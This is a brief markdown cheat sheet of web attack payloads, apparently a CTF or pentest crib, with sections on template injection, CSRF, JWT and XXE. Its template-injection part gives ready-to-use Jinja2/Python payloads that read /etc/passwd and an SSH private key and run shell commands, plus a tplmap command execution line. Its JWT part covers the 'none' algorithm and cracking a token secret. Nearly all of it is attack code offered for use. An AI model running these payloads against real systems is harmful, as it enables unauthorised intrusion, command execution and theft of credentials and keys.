# SSTI
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection
```
{{2+2}}

readfile
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
{{config.__class__.__init__.__globals__['os'].popen(cat /etc/password).read()}}


osi
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}


tool
https://github.com/epinna/tplmap
python2 -m pip
tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd =cat /etc/passwd

```
# CSRF 
```
xsrfprobe
pip install xsrfprobe
xsrfprobe -u <url>/<endpoint>
```

# JWT
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token

https://jwt.io/
```
header.payload.secret
base64encoded

RS256 :hard
HS256:may easy 
none:may easy eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0


jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE abcdefghijklmnopqrstuvwxyz 4


```

# xxe
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
